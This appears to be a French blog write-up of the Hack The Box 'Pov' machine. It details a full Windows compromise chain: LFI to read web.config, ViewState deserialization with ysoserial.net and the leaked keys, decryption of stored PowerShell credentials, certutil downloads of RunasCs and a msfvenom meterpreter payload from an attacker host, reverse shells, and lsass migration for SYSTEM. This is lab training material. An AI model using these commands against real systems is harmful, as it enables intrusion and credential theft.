---
date: 2024-06-07T12:42:21-05:00
# description: ""
image: "/images/HTB-Pov/Pov.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Pov"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Pov](https://app.hackthebox.com/machines/Pov)
* Niveau: Moyen
* OS: Windows
---

Pov débute par un simple site web. Après l'énumération, nous découvrons un sous-domaine menant à un site web ASP.NET qui s'avère être vulnérable à une faille LFI. En tirant parti de cette vulnérabilité, nous sommes en mesure de lire un fichier critique exposant des informations sensibles que nous utilisons pour exploiter le mécanisme `ViewState` du site web, ce qui nous donne accès au système cible. Après exploration du système, nous prenons le contrôle d'un autre compte en trouvant ses informations d'identification. Enfin, en abusant du privilège `SeDebugPrivileg` nous accédons à un compte administratif.

**Une machine virtuelle Windows avec Defender désactivé sera nécessaire pour reproduire l'une des étapes de l'article**.

IP cible - `10.10.11.251`

## Scanning

```
nmap -sC -sV -oA nmap/Pov 10.10.11.251
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 14:41 CDT
Nmap scan report for 10.10.11.251
Host is up (0.055s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.01 seconds
```

## Enumération

Pour faciliter l'énumération, nous ajoutons la cible à notre fichier `/etc/hosts`.

```
sudo echo "10.10.11.251 pov.htb" | sudo tee -a /etc/hosts
```

Le scan ne trouve qu'un seul port ouvert (80). En visitant `http://10.10.11.251/`, nous trouvons un site web statique offrant quelques services de sécurité mais aucune piste d'exploitation.

![Pov website](/images/HTB-Pov/pov-website.png)

Avec ffuf, nous identifions un sous-domaine.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://pov.htb -H "Host: FUZZ.pov.htb" -ic -fs 12330
```

![Pov subdomain](/images/HTB-Pov/subdomain-pov.png)

`http://dev.pov.htb/` mène au portfolio d'un développeur web compétent avec JS, ASP.NET, et PHP.

![Pov portfolio website](/images/HTB-Pov/portfolio-website.png)

Nous pouvons télécharger son CV à l'aide du bouton. Nous observons que le paramètre `file` est utilisé et qu'il fait référence à `cv.pdf`. Nous pouvons essayer de l'utiliser pour un LFI (Local File Inclusion). *Pour en savoir plus sur cette vulnérabilité, cliquez [ici](https://www.vaadata.com/blog/fr/exploitation-dune-faille-lfi-local-file-inclusion-et-bonnes-pratiques-securite/)*.

![Pov CV download request](/images/HTB-Pov/cv-download.png)

Sous Windows, le fichier hosts se trouve à l'adresse suivante `C:\WINDOWS\system32\drivers\etc\hosts`. 

![Pov LFI vulnerability](/images/HTB-Pov/LFI-hosts-file.png)

Nous arrivons à lire ce fichier! Avec l'aide de `Wappalyzer` nous apprenons que l'application est conçue avec ASP.NET et quelques recherches nous apprennent que `web.config` est le fichier de configuration « utilisé pour gérer les différents paramètres qui définissent un site web » dans les applications ASP.NET. *Pour en savoir plus, cliquez [ici](https://www.c-sharpcorner.com/UploadFile/puranindia/Asp-Net-web-configuration-file/)*.

![Pov wappalyzer info](/images/HTB-Pov/web-framework.png)

![ASP.NET Web config file](/images/HTB-Pov/web-config.png)

Nous parvenons à lire le fichier de configuration en remplaçant la valeur `file` par `/web.config`.

![Web config file read](/images/HTB-Pov/web-config-file.png)

En recherchant `asp.net machine key exploitation` nous trouvons [ cette](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter) page HackTricks expliquant comment utiliser un outil appelé [ysoserial.net](https://github.com/pwntester/ysoserial.net) pour exploiter `vIewState`. 

Sous `Testcase 1.5` nous lisons que nous devons fournir deux paramètres `--apppath=« / »` et `--path=« /hello.aspx »`.

Nous avons aussi besoin que notre payload soit encodé en base64, ce que nous obtenons sur [revshells](https://www.revshells.com/) en utilisant l'option `PowerShell #3 (Base64)`.

## Accès initial

`ysoserial` est conçu pour Windows. Nous utilisons une VM Windows avec Defender désactivé parce qu'il signale l'outil comme malveillant. Après exécution de la commande ci-dessous, nous copions son résultat et nous l'utilisons pour le paramètre `ViewState`.

**Command example**

```
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "<INSERT_REVSHELL_HERE>" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

![ViewState Payload](/images/HTB-Pov/ViewState-payload.png)

Nous obtenons une connexion sur notre listener après avoir envoyé la requête.

![Initial Foothold](/images/HTB-Pov/initial-foothold.png)

Ce compte ne peut pas accéder au fichier `user.txt` par contre nous trouvons un fichier appelé `connection.xml` dans `C:\Users\sfitz\Documents`. Il contient les informations d'identification de l'utilisateur `alaading`.

```shell
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

Nous avons une valeur de mot de passe mais il ne s'agit pas d'un hash, cette méthode utilise un module Powershell qui s'appuie sur XML sécurisé. *Pour en savoir plus [ici](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx)*.

Nous révélons le mot de passe avec les commandes ci-dessous.

```
$cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml

$cred.GetNetworkCredential() | fl
```

![User alaading user](/images/HTB-Pov/alaading-creds.png)

### Mouvement latéral

Avec les identifiants, nous pouvons maintenant utiliser [RunasCs](https://github.com/antonioCoco/RunasCs) pour obtenir un shell en tant qu'utilisateur `alaading`.

> `certutil` est utilisé pour télécharger l'outil sur la cible.

```
certutil -urlcache -f http://<IP_address>:<PORT>/RunasCs.exe runascs.exe
```

![runascs download](/images/HTB-Pov/dl-runascs.png)

Après avoir exécuté la commande ci-dessous, nous obtenons un shell.

```
.\runascs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r <IP_address>:<PORT>
```

![alaading shell](/images/HTB-Pov/alaading-shell.png)

Nous trouvons `user.txt` à l'adresse `C\Users\alaading\desktop\user.txt`.

## Elévation de Privilèges

Nous avons vu que cet utilisateur dispose du privilège `SeDebugPrivilege`. Selon [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege), "ce privilège permet de **debugger d'autres processus**, y compris de lire et d'écrire dans la mémoire. Diverses stratégies d'injection de mémoire, capables d'échapper à la plupart des antivirus et des solutions de prévention des intrusions, peuvent être employées avec ce privilège".

Nous commençons par générer un payload avec msfvenom.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP_address lport=PORT -f exe -a x64 --platform windows -o revshell.exe
```

Puis nous téléchargeons le fichier sur la cible.

```
certutil -urlcache -f http://<IP_address>:<PORT>/revshell.exe revshell.exe
```

![reverse shell file](/images/HTB-Pov/revshell.png)

Ensuite, dans Metasploit, nous lançons le `mutli/handler`, exécutons le fichier `revshell.exe` sur la cible et nous obtenons une session meterpreter.

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <IP_address>
set lport <PORT>
run
```

![meterpreter session](/images/HTB-Pov/meterpreter-session.png)

Avec la commande `ps` nous examinons les processus sur la cible et nous remarquons `lsass.exe`. Puisque nous avons le privilège `SeDebugPrivilege`, nous pouvons migrer vers ce processus.

![lsass process](/images/HTB-Pov/lsass-process.png)

![process migration](/images/HTB-Pov/process-migration.png)

Nous utilisons `shell` pour lancer un shell `cmd`, nous sommes maintenant `nt authoritysystem` et `root.txt` se trouve à `C:\NUsers\Administrator\NDesktop\Nroot.txt`.

![Root flag](/images/HTB-Pov/root-flag.png)

Une VM Windows est parfois nécessaire pour exécuter certains outils pour les tests de pénétration, je recommande [CommandoVM](https://github.com/mandiant/commando-vm) car il est livré avec de nombreux outils qui ne sont pas inclus dans Kali Linux. Vous pouvez suivre [cette vidéo](https://www.youtube.com/watch?v=nNMEhm8pvPM&ab_channel=Lsecqt) pour un tutoriel d'installation. J'espère que cet article vous a été utile !


